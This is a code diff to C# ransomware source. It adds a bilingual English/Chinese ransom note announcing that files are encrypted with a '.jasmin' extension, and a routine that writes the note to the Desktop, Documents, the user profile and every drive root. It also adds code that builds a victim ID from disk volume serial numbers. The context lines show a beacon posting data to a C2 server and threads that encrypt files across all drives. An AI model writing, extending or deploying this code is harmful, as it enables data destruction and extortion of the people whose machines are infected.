@@ -75,11 +75,44 @@ static void Beacon(){
     c.PostAsync(C2,new FormUrlEncodedContent(kv)).Wait();
   }catch{}}
 
+static string SID="";
+static string NOTE=@"
+╔══════════════════════════════════════════════════╗
+║       YOUR FILES HAVE BEEN ENCRYPTED             ║
+║           你的文件已被加密                         ║
+╚══════════════════════════════════════════════════╝
+
+AES-256 + RSA-2048 军事级加密。 系统ID: {SID}
+
+⚠️ 不要重命名/删除 .jasmin 文件，不要用第三方软件解密。
+
+🔓 解密:
+  【Windows】运行 Jasmin_Decryptor.exe → 选择.pem私钥 → Decrypt
+  【Linux/macOS】pip3 install cryptography && python3 jasmin_decrypt.py key.pem
+
+✅ SHA-256 校验确保文件100%还原
+";
+
+static void DropNotes(){
+  string txt=NOTE.Replace("{SID}",SID);
+  string[] dirs={
+    Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
+    Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
+    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)};
+  foreach(string d in dirs){
+    try{if(Directory.Exists(d))File.WriteAllText(Path.Combine(d,"READ_ME_解密教程.txt"),txt);}catch{}}
+  foreach(DriveInfo dr in DriveInfo.GetDrives()){
+    try{File.WriteAllText(dr.Name+"READ_ME_解密教程.txt",txt);}catch{}}
+}
+
 static void Main(){
+  try{var mc=new ManagementClass("Win32_LogicalDisk");
+    foreach(ManagementObject o in mc.GetInstances())SID+=Convert.ToString(o["VolumeSerialNumber"]);}catch{}
   Beacon();
   foreach(var dr in DriveInfo.GetDrives()){
     try{foreach(string ext in EXTS){
       try{foreach(string f in Directory.EnumerateFiles(dr.Name,ext,SearchOption.AllDirectories)){
         string fc=f;new Thread(()=>Enc(fc)){Priority=ThreadPriority.AboveNormal}.Start();
       }}catch{}}}catch{}}
+  DropNotes();
 }}} // end class, namespace
